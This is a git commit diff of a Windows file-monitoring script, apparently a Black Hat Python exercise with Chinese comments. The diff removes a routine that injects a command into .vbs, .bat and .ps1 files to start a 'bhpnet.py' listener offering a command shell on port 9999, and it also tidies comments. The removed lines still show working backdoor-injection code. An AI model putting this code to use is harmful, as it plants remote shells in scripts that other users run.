dc0bbac52b5e583c6042ddd5aef3f5cf22da0f40
BuhuanJin <sdsdjsasdj@outlook.com>
2021-03-27 14:48:22 +0800

    Update file_monitor_simple.py

--- file_monitor_simple.py
+++ file_monitor_simple.py
@@ -14,38 +14,11 @@ FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
-# 定义匹配特定文件扩展名的字典
-file_types = {}
 
-command = "python C:\\WINDOWS\\TEMP\\bhpnet.py –l –p 9999 –c"
-# 每段扩展名对应一个特定的标签及我们想要插入的一段脚本
-file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
-file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
-file_types['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"" % command]
-
-# 用于执行代码插入的函数
-def inject_code(full_filename, extension, contents):
-    # 判断文件是否存在标记
-    if file_types[extension][0] in contents:
-        return
-
-    # 如果没有标记的话，那么插入代码并标记
-    full_contents = file_types[extension][0]
-    full_contents += file_types[extension][1]
-    full_contents += contents
-
-    fd = open(full_filename, "wb")
-    fd.write(full_contents)
-    fd.close()
-
-    print "[\o/] Injected code"
-
-    return
-
-# 为每个监控器起一个线程
+# 为每个监控器起一个线程（用Thread来调用这监控器函数）
 def start_monitor(path_to_watch):
 
-    # 访问模式（书：为每个监控器起一个线程）
+    # 访问模式
     FILE_LIST_DIRECTORY = 0x0001
 
     # 获取文件目录句柄
@@ -106,7 +79,7 @@ def start_monitor(path_to_watch):
                 # 重命名哪个文件
                 elif action == FILE_RENAMED_FROM:
                     print "[ > ] Renamed from: %s" % full_filename
-                # 重命名后的文件名是?
+                # 重命名后的文件名
                 elif action == FILE_RENAMED_TO:
                     print "[ < ] Renamed to: %s" % full_filename
                 else:
